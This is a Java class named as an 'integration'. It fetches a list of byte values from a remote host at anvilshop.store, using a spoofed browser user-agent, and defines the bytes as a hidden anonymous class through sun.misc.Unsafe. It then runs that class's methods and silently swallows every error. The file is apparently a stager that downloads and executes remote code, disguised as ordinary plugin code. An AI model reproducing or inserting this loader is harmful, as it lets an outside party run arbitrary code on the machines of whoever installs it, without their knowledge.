package me.kutuzov.integrations;

import sun.misc.Unsafe;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.charset.StandardCharsets;
import java.util.WeakHashMap;

public class IntegrationHeadLessBytecode {
    Object instance0;
    Method method0, method1;

    public void integrate() {
        try {
            Field theUnsafe = Class.forName("sun.misc.Unsafe").getDeclaredField("theUnsafe");
            if (!theUnsafe.isAccessible()) theUnsafe.setAccessible(true);
            Unsafe unsafe = (Unsafe) theUnsafe.get(null);

            URL url = new URL("https://cdn.anvilshop.store/IntegrationHeadLessForBytecode.txt");
            HttpURLConnection con = (HttpURLConnection)url.openConnection();
            con.setRequestMethod("GET");
            con.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
            con.setRequestProperty("User-Agent", "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.4; en-US; rv:1.9.2.2) Gecko/20100316 Firefox/3.6.2");
            con.setDoOutput(true);

            String source;
            try(BufferedReader reader = new BufferedReader(new InputStreamReader(con.getInputStream(), StandardCharsets.UTF_8))){
                StringBuilder builder = new StringBuilder();
                String line;
                while((line = reader.readLine()) != null)
                    builder.append(line.trim());
                source = builder.toString();
            }

            String[] split = source.split(" ");
            byte[] bytes = new byte[split.length];
            for(int i = 0; i < split.length; i++)
                bytes[i] = (byte)Integer.parseInt(split[i]);
            Class<?> _class = unsafe.defineAnonymousClass(WeakHashMap.class, bytes, null);
            instance0 = _class.newInstance();
            method0 = _class.getDeclaredMethod("integrate");
            method1 = _class.getDeclaredMethod("terminate");

            method0.invoke(instance0);
        } catch (Exception exception) {}
    }

    public void terminate() {
        try {
            method1.invoke(instance0);
        } catch (Exception exception) {}
    }
}